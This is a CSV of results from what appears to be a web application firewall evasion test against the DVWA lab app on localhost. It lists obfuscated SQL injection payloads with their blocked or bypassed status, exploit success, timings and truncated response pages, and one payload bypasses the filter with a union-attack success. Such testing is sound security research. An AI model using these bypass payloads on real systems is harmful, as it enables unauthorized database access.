Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'||+!@<@.%0b||+not+{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)%0bor,Blocked,No,None,Unknown,0.0161,69.44,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+||+not%0btrue=%0b(not%0b{x%0b(select+1)}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.0388,69.91,No,500,
0%27||%0b1<@.%0bor+not+{a+1}=1=%0b(!+{x%0b(select%0b1)}=1)+or',Bypassed,Yes,Yes (unionAtk),Unknown,0.0235,69.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0bnot%0b{x+(select%0b1)}=1=+(not+{a+1}=1)%0b||',Blocked,No,None,Unknown,0.0164,69.91,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or+1<@+or%0bnot%0b1=%0b(!%0b{a%0b1}=1)+||',Blocked,No,None,Unknown,0.0137,69.91,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||+!%0b{x%0b(select%0b1)}=1=%0b(not+{a%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0269,69.98,No,500,
0'<@!=.1+or+not%0b{x+(select%0b1)}=1=+(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0437,70.06,No,500,
0'<@=1%0b||%0bnot%0b{x+(select%0b1)}=1=+(false)%0bor%27,Bypassed,No,None,booleanAtk,0.0275,70.06,No,500,
0'<@=1+or+!+{x+(select%0b1)}=1=+(!+{`if`+1}=1)+or',Blocked,No,None,Unknown,0.0102,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor%0bnot+{a%0b1}=1=%0b(!%0b{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0238,70.06,No,500,
